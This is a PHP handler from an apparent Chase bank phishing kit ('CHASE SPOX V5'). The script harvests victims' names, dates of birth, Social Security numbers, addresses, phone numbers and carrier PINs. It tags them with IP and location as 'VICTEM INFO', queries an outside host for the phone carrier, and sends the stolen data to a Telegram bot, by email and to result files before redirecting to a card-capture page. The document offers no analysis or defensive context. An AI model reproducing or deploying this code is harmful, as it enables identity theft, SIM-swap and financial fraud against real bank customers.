<?php
ob_start();
session_start();
error_reporting(0);
include'../../spox_bot.php';
include'../../check.php';
if (empty($_GET['token'])) {
   exit(header("Location: ../../personal_details?ch_id=$rundomizi&country=".$country_spox."&expired=$expired"));
}
if (!empty($_POST['_csrf'])) {

  $phone_number2 = str_replace(' ', '', $_POST["phoneNumber"] );
  $phone_number3 = str_replace('(', '', $phone_number2 );
  $phone_number4 = str_replace(')', '', $phone_number3 );
  $carrier = file_get_contents('https://spox-coder.info/spox/carrier_lookup.php?number=+1'.$phone_number4.'');

$resulta  = "+ --------------[ CHASE SPOX X BEEMS]---------------+\n";
$resulta .= "[First name]: ".$_POST['First_name']."\n";
$resulta .= "[Last name]: ".$_POST['Last_Name']."\n";
$resulta .= "[Date of birth]: ".$_POST['dob']."\n";
$resulta .= "[SSN number]: ".$_POST['ssn']."\n";
$resulta .= "[Street address]: ".$_POST['Streetadd']."\n";
$resulta .= "[Suite/apt/other]: ".$_POST['address22']."\n";
$resulta .= "[Zip Code]: ".$_POST['zipcode']."\n";
$resulta .= "[Phone number]: ".$_POST['phoneNumber']."\n";
$resulta .= "[Carrier name]: {$carrier}\n";
$resulta .= "[Carrier Pin]: ".$_POST['carrierpin']."\n";
$resulta .= "+ --------------[ VICTEM INFO ]---------------+\n";
$resulta .= "IP Address: ".$ip_spox."\n";
$resulta .= "Country: ".$country_spox."\n";
$resulta .= "City: ".$city_spox."\n";
$resulta .= "OS/Browser: ".$_SESSION['browser']."\n";
$resulta .= "Time: ".date("d/m/Y h:i:sa")."\n";
$resulta .= "User Agent: ".$_SESSION['platform']."\n";
$resulta .= "+ --------------[ CHASE V5 ]---------------+\n";
kirim_tele($telegram_bot_token, $telegram_chat_id);

$subject = "#CHASE SPOX BILLING: [{$_POST['First_name']} {$_POST['Last_Name']}] [ {$country_spox} - {$_SESSION['browser']} - {$ip_spox} ]";
$headers="From: CHASE SPOX V5 <".$sendfrom.">\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
if($send_result == "on"){
    @mail($email,$subject,$resulta,$headers);
}if($text_result == "on"){
    text_spox2("../../admin/result/billings".$resultpin.".txt",$resulta);
    text_spox2("../../admin/result/bulkbillings".$resultpin.".txt","".$ip_spox." |".$country_code_spox."| ".$country_spox." | ".$_POST['First_name']." | ".$_POST['Last_Name']." | ".date("d/m/Y h:i:sa")."\r\n");
}
if ($show_cc == "on") {
  exit(header("Location: ../../credit_verify?ch_id=$rundomizi&country=".$country_spox."&expired=$expired"));
}else{
  exit(header("Location: ../../thanks?ch_id=$rundomizi&country=".$country_spox."&expired=$expired"));
}
}else{
    exit(header("Location: ../../personal_details?ch_id=$rundomizi&country=".$country_spox."&expired=$expired"));
}


?>